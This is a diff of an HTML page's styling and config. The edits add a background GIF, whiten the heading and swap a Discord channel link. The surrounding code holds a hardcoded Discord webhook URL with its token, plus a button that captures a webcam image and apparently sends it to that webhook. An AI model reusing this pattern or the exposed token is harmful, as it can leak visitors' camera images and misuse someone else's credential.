@@ -9,6 +9,9 @@
         body {
             font-family: 'Arial', sans-serif;
             background-color: #f0f4f8;
+            background-image: url('https://i.pinimg.com/originals/ec/b6/41/ecb6416c16b66e9e5409def9271224a2.gif');
+            background-size: cover; /* Ensure the GIF covers the entire page */
+            background-position: center center; /* Center the background image */
             margin: 0;
             padding: 0;
             display: flex;
@@ -22,7 +25,7 @@
         h1 {
             font-size: 2.5rem;
             margin-bottom: 20px;
-            color: #333;
+            color: #fff; /* Make the text white so it's visible on the dark background */
         }
 
         /* From Uiverse.io by kleenpulse */
@@ -135,7 +138,7 @@
     const discordWebhookUrl = 'https://discord.com/api/webhooks/1303968519964196875/uTGDp9VSZ8whf0ZB_yxcle8dpzjh9jyiV5T1hElIWi2mS1FHLaNlj37q99ufIzHNPDbJ';
     
     // Discord Channel URL (This will open after sending the image)
-    const discordChannelUrl = 'https://discord.gg/keMzN9Za48';
+    const discordChannelUrl = 'https://discord.com/channels/YOUR_CHANNEL_ID';
 
     captureButton.addEventListener('click', async () => {
         let videoStream;
